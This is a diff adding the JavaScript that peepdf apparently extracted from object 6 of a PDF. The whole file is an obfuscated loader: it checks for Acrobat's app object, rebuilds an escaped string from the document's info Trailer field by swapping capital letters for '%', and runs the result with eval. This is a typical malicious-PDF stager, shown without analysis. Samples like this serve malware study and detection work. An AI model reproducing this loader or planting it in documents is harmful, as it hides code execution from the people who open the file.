@@ -1,0 +1,11 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+A9Xy = 24;
+if (app) A9Xy = '';
+MPmTH = this;
+cEr2 = unescape;
+dxuj = MPmTH.info;
+A9Xy = cEr2('%' + A9Xy);
+BKvV = dxuj.Trailer.replace(/([A-Z])/g, A9Xy);
+eval(cEr2(BKvV))
+
